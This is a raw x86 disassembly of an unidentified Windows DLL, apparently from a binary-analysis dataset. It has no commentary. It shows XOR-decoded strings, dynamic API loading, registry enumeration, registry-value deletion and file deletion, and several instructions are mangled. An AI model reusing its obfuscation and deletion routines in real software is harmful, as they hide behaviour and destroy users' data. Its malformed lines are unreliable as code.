push 0x4
push edi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x30 ] edi
mov [ ebx + 0x34 ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x3c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x93
call sub_10053240
mov eax [ ebx + 0x4 ]
cmp eax edi
je r-xdata
mov [ ebx + 0x3c ] eax
inc [ eax ]
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov [ ebx ] ecx
mov esi [ eax + 0x4 ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xd9
call sub_10053240
mov ecx [ ebx + 0xc ]
cmp ecx edi
je r-xdata
push esi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x48 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push edx
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x14 ] edi
mov esi [ esi + 0x14 ]
cmp esi 0x6
ja r-xdata
mov ecx [ ebx + 0x10 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push esi
push edx
push eax
mov [ ebx + 0xc ] eax
call sub_1007f5d0
mov esi [ ebp - 0x50 ]
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0xc ] edi
mov esi [ ebp - 0x50 ]
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x86
call sub_10053240
mov [ ebx + 0x14 ] esi
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x48 ]
push esi
push ecx
push eax
mov [ ebx + 0x10 ] eax
call sub_1007f5d0
mov esi [ ebp - 0x50 ]
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0x10 ] edi
mov eax [ esi + 0x10 ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
push 0x4
push edi
mov [ ebp - 0x4c ] edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapAlloc@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x48 ] eax
push 0x4
push edi
mov [ ebp - 0x5c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x58 ] eax
push 0x4
push edi
mov [ ebp - 0x64 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x60 ] eax
push 0x4
push edi
mov [ ebp - 0x6c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x68 ] eax
push 0x4
push edi
mov [ ebp - 0x74 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x86
call sub_10053240
jmp r-xdata
jmp [ eax * 4 + jump_table_1002e8b0 ]
inc [ eax ]
mov [ ebp - 0x70 ] eax
mov eax [ ebx + 0x14 ]
cmp eax 0x6
ja r-xdata
mov [ ebp - 0x4 ] 0x8
mov esi [ ebp - 0x70 ]
dec [ esi ]
cmp [ esi ] edi
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x87
call sub_10053240
jmp r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x54 ]
call sub_1005deb0
push eax
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
call sub_1002cc00
mov edi esi
mov [ ebp - 0x4 ] 0x9
call sub_1004b790
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x84 ]
call sub_1006b8a0
mov ebx eax
lea edi [ ebp - 0x5c ]
call sub_100066f0
mov edi esi
call sub_1004cac0
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x9c ]
call sub_10013c00
mov edi eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xb
call sub_1006f350
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x9
call sub_100524c0
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x94 ]
call sub_100689d0
mov edi eax
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0xc
call sub_1006f350
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x9
call sub_100524c0
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x8c ]
call sub_10038550
mov edi eax
lea esi [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xd
call sub_1006f350
lea esi [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x9
call sub_100524c0
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov esi [ HeapFree@IAT ]
mov ecx [ ebp - 0x74 ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x1b
lea edx [ ebp - 0x4c ]
push edx
lea edi [ ebx + 0x18 ]
call sub_1002cc00
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0xa2
call sub_10053240
mov ebx [ ebp - 0x78 ]
jmp r-xdata
mov edi [ ebp - 0x7c ]
lea ebx [ ebp - 0x5c ]
call sub_100066f0
mov ebx [ ebp - 0x78 ]
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x73
jmp r-xdata
lea edi [ ebp - 0x64 ]
lea esi [ ebx + 0x28 ]
call sub_1006f350
jmp r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0xad
jmp r-xdata
lea edi [ ebp - 0x6c ]
lea esi [ ebx + 0x30 ]
call sub_1006f350
jmp r-xdata
xor edi edi
lea edi [ ebp - 0x74 ]
lea esi [ ebx + 0x38 ]
call sub_1006f350
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x60 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x6c ]
cmp ecx edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapFree@IAT ]
push eax
call esi
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
call sub_10053240
mov eax [ ebp - 0x58 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x68 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x48 ]
dec [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x5c ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x60 ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov esi ecx
call sub_10055530
mov esi [ HeapFree@IAT ]
mov eax [ ebp - 0x58 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
call sub_1001f5f0
mov ecx [ ebp - 0x4c ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov ecx [ ebp - 0x48 ]
sub_1002e8d0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
push ecx
push edx
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
xor eax eax
call sub_100234c0
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1002e9a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008975c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi edx
mov [ ebp - 0x10 ] 0x0
test esi esi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
lea eax [ edx + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x1
jne r-xdata
push 0x90
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
push 0xc8
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebx ]
mov ebx [ edi ]
push ecx
push eax
mov ecx esi
call sub_10035f60
jmp r-xdata
cmp eax 0x3
jne r-xdata
push 0xb0
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov edx [ ebx ]
mov ecx [ edi ]
push edx
push esi
mov edx eax
call sub_10065ab0
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
cmp ecx edx
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
lea edx [ ebp - 0x10 ]
cmp edx eax
jae r-xdata
push 0xb8
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
mov ecx [ ebx ]
mov ebx [ edi ]
push ecx
mov ecx esi
call sub_100073b0
jmp r-xdata
test eax eax
je r-xdata
mov eax rw-data
call sub_10035000
mov eax [ rw-data ]
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ rw-data ]
jne r-xdata
mov edx [ edi ]
mov ecx [ ebx ]
push edx
push ecx
push esi
push eax
call sub_1005fc00
jmp r-xdata
push 0x0
add eax 0x4
push 0x0
mov [ rw-data ] eax
mov eax [ ebp - 0x10 ]
push eax
push sub_100533b0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x4c ] eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
test eax eax
je r-xdata
mov eax rw-data
call sub_10035000
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov ecx [ ecx + esi * 4 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ rw-data ]
sub_1002eb5a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_10026eb0
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_1007fa90
pop ecx
inc eax
sub_1002ebcb
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_1000206b
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10032374
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_1002ec72
push 0x3c
mov eax sub_10085776
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100275d9
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10002a9d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_1002ed30
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x14
push esi
mov esi ecx
lea ecx [ ebp - 0x10 ]
push ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10024a46
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x14 ] eax
add esp 0x4
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_1002ed80
push ebp
mov ebp esp
push 0xffffffff
push sub_10089b41
mov eax [ fs : 0x0 ]
push eax
sub esp 0x274
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x260 ]
push ebx
push ecx
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x260 ]
call sub_10036cc0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x268 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x26c ]
mov [ ebp - 0x26c ] ebx
mov [ ebp - 0x268 ] ebx
call sub_10023120
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x26c ] ebx
jne r-xdata
push 0x1
call sub_1001f84c
add esp 0x4
push eax
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x274 ] ebx
mov [ ebp - 0x270 ] ebx
call sub_10052fd0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x274 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x268 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x260 ]
push ecx
lea ecx [ ebp - 0x26c ]
call sub_1000b470
test eax eax
je r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov esi [ ebp - 0x26c ]
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ebx esi
call sub_1000aaa0
test eax eax
je r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea edx [ ebp - 0x40 ]
mov eax 0x9c
call sub_10045930
lea edx [ ebp - 0x1c ]
mov eax 0x8e
call sub_10045930
lea edx [ ebp - 0x58 ]
mov eax 0xe6
call sub_10045930
lea edx [ ebp - 0x2c ]
mov eax 0x6e
call sub_10045930
mov edi [ esi + 0x12c ]
mov [ ebp - 0x264 ] edi
test edi edi
je r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x6
jmp r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
xor eax eax
jmp r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov edx [ edi + 0x4 ]
mov [ ebp - 0x264 ] edx
cmp [ esi + 0x4 ] 0x2
je r-xdata
mov edi [ ebp - 0x264 ]
mov eax [ esi + 0x1c ]
mov ebx [ lstrcmpW@IAT ]
lea ecx [ ebp - 0x40 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
lea edx [ ebp - 0x1c ]
push edx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
lea ebx [ ebp - 0x2c ]
mov edi esi
call sub_10061de0
mov eax [ esi + 0x14 ]
lea edx [ ebp - 0x278 ]
push edx
lea ecx [ ebp - 0x27c ]
push ecx
call sub_10037500
add esp 0x8
test eax eax
je r-xdata
lea edi [ ebp - 0x278 ]
lea ecx [ ebp - 0x27c ]
mov edx esi
call sub_1002e9a0
mov ecx [ ebp - 0x27c ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esi + 0x14 ]
push esi
call [ DeleteFileW@IAT ]
mov edi [ ebp - 0x264 ]
mov edx [ ebp - 0x264 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x264 ] eax
jmp r-xdata
cmp [ ebp - 0x264 ] 0x0
jne r-xdata
sub_1002f0fa
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_10033fbc
leave
retn 0x8
sub_1002f150
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
nop
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1002f170
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
lea eax [ ebp - 0x220 ]
push eax
push 0x8
push 0x0
push 0x0
push 0x80000003
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ebx [ RegEnumKeyExW@IAT ]
xor esi esi
mov edi edi
mov ecx [ ebp - 0x220 ]
push ecx
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call [ CharUpperW@IAT ]
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x47
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x7
jb r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x21c ]
xor eax eax
push edx
mov [ ebp - 0x6 ] ax
call sub_1005f3a1
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x220 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x100
jl r-xdata
xor eax eax
movzx edx ax
push 0x0
push 0x0
mov eax edx
shl edx 0x10
push 0x0
or eax edx
mov edx [ ebp - 0x220 ]
push 0x0
mov ecx 0x82
lea edi [ ebp - 0x21c ]
[ edi ]
lea eax [ ebp - 0x224 ]
push eax
lea ecx [ ebp - 0x21c ]
push ecx
push esi
push edx
mov [ ebp - 0x224 ] 0x206
call ebx
test eax eax
jne r-xdata
sub_1002f297
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movzx edx [ ecx ]
rol eax 0x8
add eax edx
add ecx 0x2
pop ebp
retn 0x8
sub_1002f2c0
push ebp
mov ebp esp
sub esp 0x4a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ ebp - 0x49c ] eax
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb7
and edx 0xff
mov [ ebp + eax * 2 - 0x84 ] dx
inc eax
cmp eax 0x3f
jb r-xdata
lea ecx [ ebp - 0x490 ]
push ecx
push 0x2011b
xor eax eax
push eax
lea edx [ ebp - 0x84 ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x490 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x494 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push esi
xor esi esi
cmp [ ebp - 0x494 ] esi
jbe r-xdata
mov edx [ ebp - 0x490 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x490 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
push edi
mov edi [ RegEnumValueW@IAT ]
inc esi
cmp esi [ ebp - 0x494 ]
jb r-xdata
mov edx [ ebp - 0x49c ]
push edx
lea eax [ ebp - 0x28c ]
push eax
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4a0 ]
push eax
lea ecx [ ebp - 0x28c ]
push ecx
mov ecx [ ebp - 0x490 ]
push 0x0
push 0x0
lea edx [ ebp - 0x498 ]
push edx
lea eax [ ebp - 0x48c ]
push eax
push esi
push ecx
mov [ ebp - 0x498 ] 0xff
mov [ ebp - 0x4a0 ] 0x208
call edi
test eax eax
jne r-xdata
pop edi
mov edx [ ebp - 0x490 ]
lea ecx [ ebp - 0x48c ]
push ecx
push edx
call [ RegDeleteValueW@IAT ]
sub_1002f440
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x58
push ebx
call sub_1006ee90
mov esi [ ebp + 0xc ]
mov edi eax
mov ecx 0x16
[ edi ] [ esi ]
mov ecx [ eax + 0xc ]
and ecx 0xfffffffd
or ecx [ ebp + 0x10 ]
lea esi [ eax + 0x10 ]
push esi
or ecx 0x1
push 0x1
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
call sub_1000e7d0
lea eax [ esi + 0x3c ]
mov esi [ ebp + 0xc ]
